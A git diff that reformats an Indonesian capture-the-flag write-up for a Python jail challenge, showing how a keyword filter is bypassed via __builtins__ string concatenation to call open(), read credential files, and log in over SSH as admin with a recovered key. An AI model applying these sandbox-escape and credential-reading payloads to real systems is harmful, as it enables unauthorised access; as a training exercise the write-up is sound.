@@ -54,15 +54,22 @@ def main():
 
 ## Solution
 Pada chall ini kita bisa menggunakan syntax python tapi dengan batasan tidak bisa menggunakan beberapa syntax pada list `banned`. Jalankan challnya pada remote dan kita coba menggunakan syntax berikut.
-> `john > print(__builtins__.__dict__['op'+'en'])`
+
+```sh
+john > print(__builtins__.__dict__['op'+'en'])
+```
 
 Dan menghasilkan
 
-> `<built-in function open>`
+```py
+<built-in function open>
+```
 
 Kita lanjutkan dengan melihat isi source code chall ini karena pada file yang ada pada soal kurang lengkap menggunakan syntax berikut.
 
-> `john > print(__builtins__.__dict__['op'+'en'](__file__).read())`
+```sh
+john > print(__builtins__.__dict__['op'+'en'](__file__).read())
+```
 
 Dan menghasilkan [chall.py](chall.py)
 
@@ -126,9 +133,13 @@ if __name__ == "__main__":
 
 Terlihat 2 file yang menarik yaitu `notice.txt` dan `creds.txt`, kita buka kedua file tersebut.
 
-> `john > print(__builtins__.__dict__['op'+'en']('creds.txt').read())`
+```sh
+john > print(__builtins__.__dict__['op'+'en']('creds.txt').read())
+```
 
-> `john > print(__builtins__.__dict__['op'+'en']('notice.txt').read())`
+```sh
+john > print(__builtins__.__dict__['op'+'en']('notice.txt').read())
+```
 
 Dan menghasilkan [creds.txt](creds.txt) dan [notice.txt](notice.txt).
 
@@ -213,17 +224,25 @@ jrTa8qzct/8cU8idxyEQVhslaFyBBE9zQ6DKcotQCPkBf7OOKsC/
 
 Pada [notice.txt](notice.txt) terdapat hint bahwa kita harus mengakses server SSH dengan credential admin. Lalu kita akses server SSH dengan password yang ditemukan tadi. Jangan lupa juga mengganti permission [rsa.txt](rsa.txt) ke `600`
 
-> `$ chmod 600 rsa.txt`
+ ```sh
+ $ chmod 600 rsa.txt
+ ```
 
-> `$ ssh admin@34.101.122.7 -p 10009 -i rsa.txt`
+ ```sh
+ $ ssh admin@34.101.122.7 -p 10009 -i rsa.txt
+ ```
 
 Setelah berhasil mengakses server SSH kita gunakkan command
 
-> `$ ls`
+```sh
+$ ls
+```
 
 untuk melihat list file dan terdapat file `flag.txt` dan kita buka untuk mendapakan flag
 
-> `$ cat flag.txt`
+```sh
+$ cat flag.txt
+```
 
 ## Flag:
 > COMPFEST15{clo5e_y0ur_f1LE_0bj3ctS_plZzz___THXx_053fac8f23}
